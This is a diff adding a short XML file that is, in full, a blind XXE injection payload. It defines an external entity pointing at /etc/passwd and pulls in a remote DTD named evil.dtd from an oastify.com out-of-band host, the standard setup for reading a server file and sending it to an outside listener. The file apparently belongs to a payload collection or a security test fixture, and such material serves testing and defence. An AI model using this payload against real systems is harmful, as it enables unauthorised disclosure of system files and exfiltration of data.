@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM
+  "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM
+  "http://4249hlcbdm547yp7cve132sx7odm1b.oastify.com/evil.dtd">
+  %dtd;
+]>
